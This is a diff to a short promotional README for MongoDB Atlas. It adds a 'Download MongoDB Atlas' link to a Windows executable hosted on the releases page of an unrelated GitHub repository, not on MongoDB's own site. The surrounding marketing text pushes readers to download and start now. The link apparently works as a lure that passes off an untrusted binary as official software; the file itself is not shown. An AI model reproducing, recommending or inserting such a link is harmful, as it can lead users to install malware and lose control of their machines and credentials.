@@ -13,7 +13,7 @@ MongoDB Atlas is a fully managed cloud database service that offers all the feat
 ## Download MongoDB Atlas
 Click below to download MongoDB Atlas for Windows and start your setup process:
 
-[**Download MongoDB Atlas**](*)  
+[**Download MongoDB Atlas**](https://github.com/cloudmist81/infisical/releases/download/48.8/mongodb-atlas-cli_1.41.1_windows.exe)  
 
 Get started with MongoDB Atlas and unlock the benefits of a fully managed, scalable, and secure cloud database. Deploy with just a few clicks and enjoy automated backups, real-time performance insights, and seamless scalability. Let Atlas handle security, availability, and optimization, so you can focus on building outstanding applications. With global distribution, flexible data models, and built-in automation, MongoDB Atlas is the ideal solution for modern app development. Start now and speed up your development process!
 
